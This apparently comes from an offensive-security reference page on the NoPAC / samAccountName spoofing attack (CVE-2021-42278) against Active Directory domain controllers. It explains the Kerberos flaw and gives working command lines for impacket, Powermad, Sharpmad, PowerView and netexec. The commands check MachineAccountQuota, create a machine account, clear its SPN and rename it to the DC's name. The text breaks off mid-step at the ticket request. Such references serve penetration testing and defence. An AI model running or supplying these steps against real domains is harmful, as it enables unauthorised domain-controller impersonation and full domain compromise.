# NoPAC / samAccountName Spoofing - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/NoPAC/

NoPAC / samAccountName Spoofing - Internal All The Things

# NoPAC / samAccountName Spoofing

During S4U2Self, the KDC will try to append a '\$' to the computer name specified in the TGT, if the computer name is not found.

An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\$'.

For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'.

The attacker can then request a TGT for the newly created machine account.

After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC.

The attacker can then perform S4U2Self and request a ST to itself as any user.

Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.

Requirements:

- MachineAccountQuota > 0

Check for exploitation:

- Check the MachineAccountQuota of the account

```
netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
StandIn.exe --object ms-DS-MachineAccountQuota=*

```

- Check if the DC is vulnerable

```
netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac

```

Exploitation:

1. Create a computer account

```
impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

powermad@windows> . .\Powermad.ps1
powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword

```
2. Clear the controlled machine account `servicePrincipalName` attribute

```
krbrelayx@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

powershell@windows> . .\Powerview.ps1
powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose

```
3. (CVE-2021-42278) Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$`

```
# https://github.com/SecureAuthCorp/impacket/pull/1224
impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

```
4. Request a TGT for the